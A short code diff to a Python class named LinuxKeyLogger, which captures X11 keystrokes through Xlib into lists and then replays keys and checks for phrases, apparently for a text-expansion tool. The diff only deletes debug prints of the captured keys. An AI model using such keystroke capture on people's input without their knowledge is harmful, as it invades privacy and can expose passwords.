@@ -49,12 +49,10 @@ class LinuxKeyLogger(threading.Thread):
         try:
             while self.capture:
                 event = self.display.next_event()
-                print(self.capturedKeys)
                 self.handleEvent(event)
                 self.display.allow_events(X.AsyncKeyboard, X.CurrentTime)
         except Exception as e:
             print(e)
-        print(self.capturedKeys)
 
     def handleEvent(self, event):
         """
@@ -69,7 +67,6 @@ class LinuxKeyLogger(threading.Thread):
             char = Xlib.XK.keysym_to_string(self.display.keycode_to_keysym(event.detail, event.state))
             if char is not None:
                 self.capturedKeys.append(char)
-                print(self.capturedKeys)
                 self.windowKeys.append(char)
             self.send_key(event.detail, event.state)
             self.phrase_check()
